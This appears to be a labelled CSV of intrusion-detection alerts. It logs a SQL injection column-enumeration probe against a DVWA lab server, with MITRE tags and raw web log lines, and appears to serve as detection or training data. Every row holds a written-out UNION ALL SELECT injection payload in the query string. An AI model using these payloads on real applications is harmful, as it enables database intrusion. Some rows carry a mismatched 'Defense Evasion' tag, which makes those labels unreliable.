timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T22:01:52.084+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:50 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",2
2025-03-31T22:01:56.090+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:55 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",2
2025-03-31T22:02:02.097+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:00 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",2
2025-03-31T22:02:06.101+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:05 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",2
2025-03-31T22:02:12.110+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:10 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",2
2025-03-31T22:02:16.115+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:15 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",2
2025-03-31T22:02:22.121+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:20 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",2
2025-03-31T22:02:26.127+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:26 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",2
2025-03-31T22:02:32.133+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:31 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",2
2025-03-31T22:02:36.156+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:36 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",2
2025-03-31T22:02:42.167+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:41 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",2
2025-03-31T22:02:46.167+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:46 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",2
2025-03-31T22:02:52.175+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:51 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",2
2025-03-31T22:02:56.181+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:02:56 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",2
2025-03-31T22:03:02.182+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:01 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",2
2025-03-31T22:03:08.191+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:06 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",2
2025-03-31T22:03:12.195+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:11 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX'--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX'--%20,2
2025-03-31T22:03:18.203+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:16 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2--%20",2
2025-03-31T22:03:22.207+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:21 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3--%20",2
2025-03-31T22:03:28.215+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:26 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4--%20",2
2025-03-31T22:03:32.219+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:31 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5--%20",2
2025-03-31T22:03:38.229+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:36 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6--%20",2
2025-03-31T22:03:42.232+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:41 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7--%20",2
2025-03-31T22:03:48.240+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:46 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8--%20",2
2025-03-31T22:03:52.244+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:51 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9--%20",2
2025-03-31T22:03:58.253+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:03:56 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10--%20",2
2025-03-31T22:04:02.256+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:01 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11--%20",2
2025-03-31T22:04:08.263+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:06 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12--%20",2
2025-03-31T22:04:12.267+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:11 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13--%20",2
2025-03-31T22:04:18.279+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:16 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--%20",2
2025-03-31T22:04:22.280+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:21 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20",2
2025-03-31T22:04:28.287+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:26 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20",2
2025-03-31T22:04:32.294+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:31 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20",2
2025-03-31T22:04:38.360+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:36 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20",2
2025-03-31T22:04:42.320+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:04:41 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20",2
